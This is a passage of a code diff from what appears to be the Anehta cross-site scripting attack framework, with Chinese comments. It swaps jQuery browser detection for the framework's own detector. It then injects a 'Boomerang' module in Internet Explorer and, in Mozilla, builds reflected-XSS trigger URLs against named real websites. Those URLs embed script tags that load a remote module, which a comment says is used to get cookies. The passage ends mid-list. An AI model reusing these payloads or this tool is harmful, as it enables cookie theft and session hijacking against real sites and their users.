@@ -6,13 +6,14 @@
 ///////////////////////////////////////////////////
 
 // 先判断浏览器版本 $.browser.msie/safari/opera/mozilla
-if ($.browser.msie){
-	//alert("ie"+$.browser.version);
+var bs = new anehta.detect.browser();
+
+if ( bs.type() == "msie" ){
 	//IE最好只通过回旋镖模块获取一次
 	anehta.inject.AddScript(BoomerangMod);
 	
-} else if ($.browser.mozilla){ 
-	//alert("mozilla"+$.browser.version);
+} else if ( bs.type() == "mozilla" ){ 
+
 	var target_url = new Array( // 远程xss trigger; 这里只在远程加载clxmod以获取cookie.
 	                     "http://www.playback.fr/recherche.php?search=<script src="+ClxMod+"></script>+&button=OK",
 	                     "http://www.gobolinux.org/?page=<script src="+ClxMod+"></script>",
